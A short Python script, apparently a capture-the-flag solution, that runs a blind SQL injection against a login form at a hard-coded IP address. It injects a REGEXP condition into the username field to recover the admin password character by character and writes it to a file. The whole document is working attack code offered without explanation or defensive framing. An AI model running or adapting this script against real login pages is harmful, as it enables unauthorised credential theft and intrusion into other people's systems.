import requests,time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://52.183.128.218/"
username = 'admin" AND password REGEXP "^'

data = {'username' : username}

#r = s.post(url=URL,data=data)
#print(r.text)

final = ""

for i in range(64):
	for ch in dictionary:

		r = s.post(url=URL,data = {'username':username+final+ch})
		if r.text.find('This user exists.') != -1:
			final = final + ch
			print("Decoding password:",final)
			break

	r = s.post(url = URL,data = {'username':'admin" AND password="'+final})
	if r.text.find('This user exists.')!=-1:
		print("Password is",final)
		break

with open('password.txt','w') as f:
	f.write(final)

